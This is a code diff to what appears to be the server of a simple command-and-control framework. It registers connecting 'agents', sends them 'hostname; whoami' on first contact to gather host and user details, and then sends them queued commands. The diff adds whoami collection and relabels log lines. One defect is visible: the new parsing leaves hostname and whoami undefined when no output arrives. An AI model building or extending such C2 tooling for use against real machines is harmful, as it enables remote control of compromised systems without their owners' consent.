@@ -42,20 +42,21 @@ registered_agents_ip = {} # Lookup by ip
 curr_id = 1
 
 class Agent:
-    def __init__(self, id, ip, hostname):
+    def __init__(self, id, ip, hostname, whoami):
         self.id = id
         self.ip = ip
         self.hostname = hostname
         self.command_queue = queue.Queue()
         self.curr_cmd_id = 1
+        self.whoami = whoami
 
 # Function to handle client connections
 def handle_client(client_socket, client_address):
     if client_address[0] not in registered_addresses:
         try:
             # Get hostname
-            command = "hostname" + "\n"
-            logging.info(f"[+] New agent connected ({client_address[0]}). Getting hostname...")
+            command = "hostname; whoami" + "\n"
+            logging.info(f"[+] New agent connected ({client_address[0]}). Gathering info...")
             client_socket.sendall(command.encode())
 
             # Receive output from the client until the delimiter
@@ -72,7 +73,11 @@ def handle_client(client_socket, client_address):
             # Register the agent
             registered_addresses.add(client_address[0])
             global curr_id
-            new_agent = Agent(curr_id, client_address[0], output.strip())
+            if output:
+                split_output = output.split("\n")
+                hostname = split_output[0].strip()
+                whoami = split_output[1].strip()
+            new_agent = Agent(curr_id, client_address[0], hostname, whoami)
             curr_id += 1
             registered_agents_id.append(new_agent)
             registered_agents_ip[client_address[0]] = new_agent
@@ -90,7 +95,7 @@ def handle_client(client_socket, client_address):
                 if not agent.command_queue.empty():
                     # Get the next command from the queue
                     command = agent.command_queue.get()
-                    logging.info(f"[+] Sending command to {client_address}: {command}")
+                    logging.info(f"[+] Sending command to <{agent.hostname}> ({agent.ip}): {command}")
                     client_socket.sendall(command.encode())
 
                     # Receive output from the client until the delimiter
